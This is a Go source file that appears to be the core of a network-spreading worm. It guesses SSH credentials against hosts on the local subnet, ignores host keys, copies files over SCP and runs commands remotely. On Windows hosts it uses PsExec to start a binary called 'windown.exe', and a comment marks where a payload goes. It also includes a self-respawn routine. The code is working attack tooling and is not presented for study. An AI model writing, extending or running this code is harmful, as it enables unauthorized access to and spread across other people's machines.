package main

import (
	"os"
	"log"
	"golang.org/x/crypto/ssh"
	"fmt"
	"time"
	"strings"
	"bufio"
	"github.com/tmc/scp"
	"os/exec"
	"net"
	"regexp"
	"strconv"
	"github.com/go-openapi/errors"
)

type infosession struct {
	iswork bool
	username string
	password string
	ssh	*ssh.Client

}

func handler1() {
	cmd := exec.Command(os.Args[0])
	cmd.Start()
	os.Exit(13)
}


func getinssh(myip string, user string, passwd string, port int64) (myreturn infosession, reterr error) {
	sshConfig := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         2 * time.Second,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd)},
	}
	var dest= myip + ":" + strconv.FormatInt(port, 10)
	fmt.Println(dest)
	connection, err := ssh.Dial("tcp", dest, sshConfig)
	if err != nil {
		fmt.Println(err)
		if strings.Contains(err.Error(), "unable to authenticate") {
			return infosession{false,"","",nil}, errors.New(1,"Unable to authenticate")
		} else {
			return infosession{false,"","",nil}, errors.New(2,"Unknown error")
		}
	}
	return infosession{true,user,passwd,connection}, nil
}

func newsession(connection *ssh.Client) (session *ssh.Session, reterr error) {
	session, err := connection.NewSession()
	if err != nil {
		return nil, errors.New(3,"Unable to create session")
	}
	return
}

func execlinuxcmd(session *ssh.Session, cmd string) (err error) {
	_, err = session.CombinedOutput(cmd)
	return
}

func scpexec(session *ssh.Session, srcfile string, destfile string) (err error) {
	err = scp.CopyPath(srcfile, destfile, session)
	return
}


func getinwin(myip string, user string, passwd string) (wincon int) {
	pscom := "PsExec.exe"
	iparg := "\\\\" + myip
	cmd := exec.Command(pscom, iparg, "-n", "5", "-u", user, "-p", passwd, "-accepteula", "cmd", "/c", "START", "/b", ".\\windown.exe")
	output, _ := cmd.CombinedOutput()
	strout := string(output)
	if regexp.MustCompile(`error code 0`).MatchString(strout) == true { //true work case
		//put payload here
		fmt.Println("exit 1")

		wincon = 1
	} else if regexp.MustCompile(`The user name or password is incorrect.`).MatchString(strout) == true { //false case
		wincon = 2
		fmt.Println("exit 2")
	} else { //psexec doesn't work
		wincon = 3
		fmt.Println("exit 3")
	}
	return
}


func readinfile(myfile string) (readinarr []string) {
	file, err := os.Open(myfile)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		readinarr = append(readinarr, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	return
}
func GetOutboundIP() (myip string) {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	myip = localAddr.IP.String()
	re := regexp.MustCompile(`.*\..*\.`)
	myip = re.FindString(myip)
	return myip
}
